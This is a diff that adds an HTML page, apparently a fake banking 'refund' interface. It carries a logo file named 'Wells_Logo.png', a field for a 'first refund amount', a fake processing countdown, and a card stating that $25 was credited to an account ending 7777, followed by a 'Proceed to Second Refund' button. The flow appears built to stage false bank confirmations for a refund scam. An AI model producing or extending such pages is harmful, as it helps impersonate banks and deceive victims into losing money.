@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>https://caseyroach-design.github.io/index.html12</title>
+  <link rel="stylesheet" href="page3.css" />
+</head>
+<body>
+
+  <main class="container">
+    <!-- Image Logo: Replace "logo.png" with your image file path or URL -->
+    <div class="logo-wrapper">
+      <img src="Wells_Logo.png" alt="Application Logo" class="app-logo" />
+    </div>
+
+    <!-- PAGE 7: Enter First Collect Amount -->
+    <section id="page7" class="page active">
+      <h1 class="title center-title">Enter First Refund Amount</h1>
+
+      <form id="collectAmountForm" class="form" novalidate>
+        <div class="input-group">
+          <input 
+            type="text" 
+            id="collectAmount" 
+            placeholder="First refund amount" 
+            inputmode="decimal"
+            required
+          />
+          <div class="error-tooltip" id="collectAmountError">
+            <div class="exclamation-box">!</div>
+            <span>Please fill out this field.</span>
+          </div>
+        </div>
+
+        <button type="submit" class="submit-btn">Submit</button>
+      </form>
+    </section>
+
+    <!-- PAGE 8: Processing / Countdown Screen -->
+    <section id="page8" class="page">
+      <div class="timer-wrapper">
+        <svg class="timer-svg" viewBox="0 0 100 100">
+          <circle class="timer-bg" cx="50" cy="50" r="42" />
+          <circle id="timerProgress" class="timer-progress" cx="50" cy="50" r="42" />
+        </svg>
+        <span id="timerText" class="timer-text">0:30</span>
+      </div>
+
+      <p class="processing-text">Your Refund is Processing Please <br> Wait</p>
+    </section>
+
+
+    <!-- PAGE 9: Information & Proceed to Second Amount Card -->
+    <section id="page9" class="page">
+      <div class="purple-card-container">
+        <div class="purple-card">
+          <p class="card-description">
+            Your Amount $25 has been<br />
+            Credited successfully to<br />
+            Your Bank Account ending<br />
+            with 7777.
+          </p>
+
+          <button type="button" id="proceedBtn" class="submit-btn proceed-btn">
+            Proceed to Second Refund
+          </button>
+        </div>
+      </div>
+    </section>
+
+
+    </section>
+  </main>
+
+  <script src="script.js"></script>
+</body>
+</html>
